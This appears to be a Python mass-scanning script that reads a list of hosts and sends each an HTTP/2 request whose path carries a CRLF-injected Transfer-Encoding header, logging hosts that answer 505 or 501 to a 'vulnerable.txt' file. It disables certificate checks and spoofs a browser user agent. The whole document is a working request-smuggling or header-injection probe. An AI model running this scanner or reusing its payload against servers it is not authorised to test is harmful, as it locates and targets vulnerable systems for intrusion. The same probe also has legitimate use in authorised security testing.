import httpx
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from httpx import RequestError


# Read hosts from file
with open('hosts.txt', 'r') as file:
    hosts = file.read().splitlines()

# Initialize lists for success and failure hosts
success_hosts = []
failure_hosts = []

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0'
}

# Process each host
for host in hosts:
    url = f'https://{host}/%20HTTP/9%0D%0ATransfer-Encoding:%20nonexistant%0D%0Ax-end:%20a'
    try:
        with httpx.Client(http2=True, verify=False) as client:
            response = client.get(url, headers=headers, timeout=4, follow_redirects=False)  

        if response.status_code == 505 or response.status_code == 501:
            # Add host to success list and write to file
            success_hosts.append(host)
            with open('vulnerable.txt', 'a') as file:
                file.write(host + '\n')
            print('\033[92mSUCCESS saved host to vulnerable.txt', host, '\033[0m')
        else:
            # Add host to failure list and print response code
            failure_hosts.append(host)
            print('\033[91mFAIL', host, response.status_code, '\033[0m')
    except RequestError as e:
        if 'Errno 61' in str(e):
            print('not open')
        elif 'Errno 8]' in str(e):
            print('Unknown...')
        else:
            print('An error occurred:', e)

# Print summary
print('Success hosts:', success_hosts)
print('Failure hosts:', failure_hosts)
